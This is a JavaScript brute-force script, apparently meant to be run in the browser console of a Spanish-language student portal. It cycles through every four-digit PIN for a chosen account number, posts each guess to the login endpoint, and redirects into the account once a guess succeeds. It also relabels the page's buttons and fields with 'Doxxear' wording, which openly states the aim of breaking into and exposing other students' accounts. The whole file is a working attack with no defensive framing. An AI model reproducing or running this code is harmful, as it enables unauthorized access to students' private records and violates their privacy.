(async function(numCuenta = 300000, inicio = 1, final = 9999) {
    const log10 = Math.log(10);
    const trailingZeroes = ['000', '00', '0'];
    const postUrl = "modelo/modAcceso_SyllabusAlumno.php";

    const addTrailingZeroes = function(number) {
        if (number >= 1000) return number;

        const numberOfZeroes = Math.trunc(Math.log(number) / log10);
        return `${trailingZeroes[numberOfZeroes]}${number}`;
    }

    async function sendPost(accoutNumber, nip) {
        const datos = `txtNumCuenta=${accoutNumber}&txtNIP=${nip}&txtModulo=Consulta+M%C3%B3vil&hdnIdPersona=&hdnNombreAlumno=`;

        console.log(nip);

        return await $.post(postUrl, datos);
    }

    async function dox(accountNumber = numCuenta, lowerBound = inicio, upperBound = final) {
        for (let i = lowerBound; i <= upperBound; i++) {        
            const nip = addTrailingZeroes(i);
            const respuesta = await sendPost(accountNumber, nip);
    
            console.log(respuesta);
    
            if (respuesta.noError <= 0) {
                window.location.href = "vista/index.php";
                break;
            }
            else if (respuesta.mensaje === 'No tiene permiso para accesar a este módulo') {
                console.log(respuesta.mensaje);
                break;
            }
        }
    }

    // Setup UI
    (() => {
        const labels = document.querySelectorAll('label');

        const numCuentaInput = document.getElementById('txtNumCuenta');
        numCuentaInput.type = 'number';

        const labelNumCuenta = labels[0]
        labelNumCuenta.textContent = 'Número de cuenta a doxxear';

        const nipLabel = labels[1];
        nipLabel.textContent = 'Rango de NIPs';

        const nipInput = document.getElementById('txtNIP');
        nipInput.value = inicio;
        nipInput.type = 'number';

        const secondNipInput = nipInput.cloneNode();
        secondNipInput.value = final;
        secondNipInput.type = 'number';

        nipInput.insertAdjacentElement('afterend', secondNipInput);

        const botonSubmit = document.querySelector(".btn-lg");
        botonSubmit.textContent = 'Doxxear';
        botonSubmit.onclick = (event) => {
            event.preventDefault();
            const accountNum = numCuentaInput.value;
            const lowerBound = nipInput.value;
            const upperBound = secondNipInput.value;
            botonSubmit.textContent = 'Doxxeando...';
            botonSubmit.disabled = true;

            dox(accountNum, lowerBound, upperBound);
        }
    })();
})();
